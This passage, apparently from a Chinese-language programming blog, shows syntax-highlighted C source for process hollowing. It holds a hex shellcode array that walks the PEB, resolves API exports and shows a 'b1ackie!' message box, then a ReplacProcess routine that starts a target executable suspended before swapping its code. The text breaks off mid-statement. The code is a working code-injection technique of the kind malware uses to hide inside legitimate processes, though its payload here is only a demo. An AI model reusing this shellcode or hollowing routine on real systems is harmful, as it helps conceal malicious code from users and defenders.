,<span class="hljs-number">0xBE</span><br>,<span class="hljs-number">0x79</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xBF</span> ,<span class="hljs-number">0x41</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xC0</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x8D</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xB4</span> ,<span class="hljs-number">0x51</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x52</span> ,<span class="hljs-number">0xFF</span><br>,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x89</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xF4</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xC4</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xC5</span> ,<span class="hljs-number">0x65</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x73</span> ,<span class="hljs-number">0xC6</span><br>,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xC7</span> ,<span class="hljs-number">0x73</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xC8</span> ,<span class="hljs-number">0x61</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xC9</span> ,<span class="hljs-number">0x67</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xCA</span> ,<span class="hljs-number">0x65</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xCB</span><br>,<span class="hljs-number">0x42</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0x6F</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xCD</span> ,<span class="hljs-number">0x78</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xCE</span> ,<span class="hljs-number">0x41</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xCF</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xC6</span><br>,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xD0</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xD1</span> ,<span class="hljs-number">0x73</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xD2</span> ,<span class="hljs-number">0x65</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xD3</span> ,<span class="hljs-number">0x72</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xD4</span><br>,<span class="hljs-number">0x33</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xD5</span> ,<span class="hljs-number">0x32</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xD6</span> ,<span class="hljs-number">0x2E</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xD7</span> ,<span class="hljs-number">0x64</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xD8</span> ,<span class="hljs-number">0x6C</span> ,<span class="hljs-number">0xC6</span><br>,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xD9</span> ,<span class="hljs-number">0x6C</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xDA</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x8D</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xC4</span> ,<span class="hljs-number">0x50</span> ,<span class="hljs-number">0x8D</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xD0</span> ,<span class="hljs-number">0x51</span> ,<span class="hljs-number">0xFF</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xF4</span><br>,<span class="hljs-number">0x50</span> ,<span class="hljs-number">0xFF</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x89</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xF0</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xDC</span> ,<span class="hljs-number">0x62</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xDD</span> ,<span class="hljs-number">0x31</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xDE</span><br>,<span class="hljs-number">0x61</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xDF</span> ,<span class="hljs-number">0x63</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xE0</span> ,<span class="hljs-number">0x6B</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xE1</span> ,<span class="hljs-number">0x69</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xE2</span> ,<span class="hljs-number">0x65</span> ,<span class="hljs-number">0xC6</span><br>,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xE3</span> ,<span class="hljs-number">0x21</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xE4</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xE8</span> ,<span class="hljs-number">0x74</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xE9</span> ,<span class="hljs-number">0x65</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xEA</span><br>,<span class="hljs-number">0x73</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xEB</span> ,<span class="hljs-number">0x74</span> ,<span class="hljs-number">0xC6</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xEC</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x6A</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x8D</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xE8</span> ,<span class="hljs-number">0x52</span> ,<span class="hljs-number">0x8D</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xDC</span><br>,<span class="hljs-number">0x50</span> ,<span class="hljs-number">0x6A</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xFF</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xF0</span> ,<span class="hljs-number">0x33</span> ,<span class="hljs-number">0xC0</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0xE5</span> ,<span class="hljs-number">0x5D</span> ,<span class="hljs-number">0xC3</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span><br>,<span class="hljs-number">0x64</span> ,<span class="hljs-number">0xA1</span> ,<span class="hljs-number">0x30</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x40</span> ,<span class="hljs-number">0x0C</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x40</span> ,<span class="hljs-number">0x14</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x40</span><br>,<span class="hljs-number">0x10</span> ,<span class="hljs-number">0xC3</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0xCC</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0xEC</span> ,<span class="hljs-number">0x83</span><br>,<span class="hljs-number">0xEC</span> ,<span class="hljs-number">0x2C</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0x08</span> ,<span class="hljs-number">0x89</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x03</span> ,<span class="hljs-number">0x51</span> ,<span class="hljs-number">0x3C</span> ,<span class="hljs-number">0x89</span><br>,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xE8</span> ,<span class="hljs-number">0xB8</span> ,<span class="hljs-number">0x08</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x6B</span> ,<span class="hljs-number">0xC8</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xE8</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x03</span> ,<span class="hljs-number">0x44</span><br>,<span class="hljs-number">0x0A</span> ,<span class="hljs-number">0x78</span> ,<span class="hljs-number">0x89</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xF0</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xF0</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x03</span> ,<span class="hljs-number">0x51</span> ,<span class="hljs-number">0x20</span> ,<span class="hljs-number">0x89</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xE0</span> ,<span class="hljs-number">0x8B</span><br>,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xF0</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x03</span> ,<span class="hljs-number">0x48</span> ,<span class="hljs-number">0x24</span> ,<span class="hljs-number">0x89</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xDC</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xF0</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x03</span><br>,<span class="hljs-number">0x42</span> ,<span class="hljs-number">0x1C</span> ,<span class="hljs-number">0x89</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xD8</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xF0</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x51</span> ,<span class="hljs-number">0x18</span> ,<span class="hljs-number">0x89</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xE4</span> ,<span class="hljs-number">0xC7</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xEC</span> ,<span class="hljs-number">0x00</span><br>,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xC7</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xF4</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xEB</span> ,<span class="hljs-number">0x09</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xF4</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xC0</span> ,<span class="hljs-number">0x01</span><br>,<span class="hljs-number">0x89</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xF4</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xF4</span> ,<span class="hljs-number">0x3B</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xE4</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0x6D</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xF4</span><br>,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xE0</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x03</span> ,<span class="hljs-number">0x0C</span> ,<span class="hljs-number">0x90</span> ,<span class="hljs-number">0x89</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0xBA</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x6B</span><br>,<span class="hljs-number">0xC2</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0xBE</span> ,<span class="hljs-number">0x14</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xFA</span> ,<span class="hljs-number">0x47</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0x85</span> ,<span class="hljs-number">0x41</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span><br>,<span class="hljs-number">0xB8</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xC1</span> ,<span class="hljs-number">0xE0</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0xBE</span> ,<span class="hljs-number">0x14</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xFA</span> ,<span class="hljs-number">0x65</span><br>,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0x85</span> ,<span class="hljs-number">0x29</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xB8</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xD1</span> ,<span class="hljs-number">0xE0</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0xBE</span><br>,<span class="hljs-number">0x14</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xFA</span> ,<span class="hljs-number">0x74</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0x85</span> ,<span class="hljs-number">0x12</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xB8</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x6B</span> ,<span class="hljs-number">0xC8</span><br>,<span class="hljs-number">0x03</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0xBE</span> ,<span class="hljs-number">0x04</span> ,<span class="hljs-number">0x0A</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x50</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0x85</span> ,<span class="hljs-number">0xFA</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xB9</span><br>,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xC1</span> ,<span class="hljs-number">0xE1</span> ,<span class="hljs-number">0x02</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0xBE</span> ,<span class="hljs-number">0x04</span> ,<span class="hljs-number">0x0A</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x72</span> ,<span class="hljs-number">0x0F</span><br>,<span class="hljs-number">0x85</span> ,<span class="hljs-number">0xE2</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xB9</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x6B</span> ,<span class="hljs-number">0xD1</span> ,<span class="hljs-number">0x05</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0xBE</span><br>,<span class="hljs-number">0x0C</span> ,<span class="hljs-number">0x10</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xF9</span> ,<span class="hljs-number">0x6F</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0x85</span> ,<span class="hljs-number">0xCA</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xBA</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x6B</span> ,<span class="hljs-number">0xC2</span><br>,<span class="hljs-number">0x06</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0xBE</span> ,<span class="hljs-number">0x14</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xFA</span> ,<span class="hljs-number">0x63</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0x85</span> ,<span class="hljs-number">0xB2</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xB8</span><br>,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x6B</span> ,<span class="hljs-number">0xC8</span> ,<span class="hljs-number">0x07</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0xBE</span> ,<span class="hljs-number">0x04</span> ,<span class="hljs-number">0x0A</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x41</span> ,<span class="hljs-number">0x0F</span><br>,<span class="hljs-number">0x85</span> ,<span class="hljs-number">0x9A</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xB9</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xC1</span> ,<span class="hljs-number">0xE1</span> ,<span class="hljs-number">0x03</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0xBE</span><br>,<span class="hljs-number">0x04</span> ,<span class="hljs-number">0x0A</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x64</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0x85</span> ,<span class="hljs-number">0x82</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0xB9</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x6B</span> ,<span class="hljs-number">0xD1</span><br>,<span class="hljs-number">0x09</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0xBE</span> ,<span class="hljs-number">0x0C</span> ,<span class="hljs-number">0x10</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xF9</span> ,<span class="hljs-number">0x64</span> ,<span class="hljs-number">0x75</span> ,<span class="hljs-number">0x6E</span> ,<span class="hljs-number">0xBA</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span><br>,<span class="hljs-number">0x6B</span> ,<span class="hljs-number">0xC2</span> ,<span class="hljs-number">0x0A</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0xBE</span> ,<span class="hljs-number">0x14</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xFA</span> ,<span class="hljs-number">0x72</span> ,<span class="hljs-number">0x75</span> ,<span class="hljs-number">0x5A</span> ,<span class="hljs-number">0xB8</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span><br>,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x6B</span> ,<span class="hljs-number">0xC8</span> ,<span class="hljs-number">0x0B</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0xBE</span> ,<span class="hljs-number">0x04</span> ,<span class="hljs-number">0x0A</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x65</span> ,<span class="hljs-number">0x75</span> ,<span class="hljs-number">0x46</span> ,<span class="hljs-number">0xB9</span><br>,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x6B</span> ,<span class="hljs-number">0xD1</span> ,<span class="hljs-number">0x0C</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0xBE</span> ,<span class="hljs-number">0x0C</span> ,<span class="hljs-number">0x10</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xF9</span> ,<span class="hljs-number">0x73</span> ,<span class="hljs-number">0x75</span><br>,<span class="hljs-number">0x32</span> ,<span class="hljs-number">0xBA</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x6B</span> ,<span class="hljs-number">0xC2</span> ,<span class="hljs-number">0x0D</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xFC</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0xBE</span> ,<span class="hljs-number">0x14</span> ,<span class="hljs-number">0x01</span> ,<span class="hljs-number">0x83</span> ,<span class="hljs-number">0xFA</span><br>,<span class="hljs-number">0x73</span> ,<span class="hljs-number">0x75</span> ,<span class="hljs-number">0x1E</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xF4</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xDC</span> ,<span class="hljs-number">0x0F</span> ,<span class="hljs-number">0xB7</span> ,<span class="hljs-number">0x14</span> ,<span class="hljs-number">0x41</span> ,<span class="hljs-number">0x89</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xEC</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x45</span><br>,<span class="hljs-number">0xEC</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x4D</span> ,<span class="hljs-number">0xD8</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xF8</span> ,<span class="hljs-number">0x03</span> ,<span class="hljs-number">0x14</span> ,<span class="hljs-number">0x81</span> ,<span class="hljs-number">0x89</span> ,<span class="hljs-number">0x55</span> ,<span class="hljs-number">0xD4</span> ,<span class="hljs-number">0xEB</span> ,<span class="hljs-number">0x05</span> ,<span class="hljs-number">0xE9</span> ,<span class="hljs-number">0x7E</span> ,<span class="hljs-number">0xFE</span><br>,<span class="hljs-number">0xFF</span> ,<span class="hljs-number">0xFF</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0x45</span> ,<span class="hljs-number">0xD4</span> ,<span class="hljs-number">0x8B</span> ,<span class="hljs-number">0xE5</span> ,<span class="hljs-number">0x5D</span> ,<span class="hljs-number">0xC3</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> ,<span class="hljs-number">0x00</span> &#125;;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (ReplacProcess(<span class="hljs-string">&quot;C:\\Users\\Tophanter\\Desktop\\ConsoleApplication1.exe&quot;</span>) == TRUE) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;傀儡进程成功\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;失败\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function">BOOL <span class="hljs-title">ReplacProcess</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* pszFilePath)</span></span><br><span class="hljs-function"></span>&#123;<br>STARTUPINFO si;<br>PROCESS_INFORMATION pi;<br>CONTEXT threadContext = &#123; <span class="hljs-number">0</span> &#125;;<br>RtlZeroMemory(&amp;si, <span class="hljs-keyword">sizeof</span>(si));<br>RtlZeroMemory(&amp;pi, <span class="hljs-keyword">sizeof</span>(pi));<br>RtlZeroMemory(&amp;threadContext, <span class="hljs-keyword">sizeof</span>(threadContext));<br>si.cb = <span class="hljs-keyword">sizeof</span>(STARTUPINFO);<br>BOOL Flag = FALSE;<br><span class="hljs-comment">//创建挂起的进程</span><br>Flag = CreateProcess(pszFilePath, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, FALSE, CREATE_SUSPENDED, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;si, &amp;pi);<br><span class="hljs-keyword">if</span> (Flag == FALSE) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;创建挂起进程失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">//获取线程的上下文</span><br>threadContext.ContextFlags = 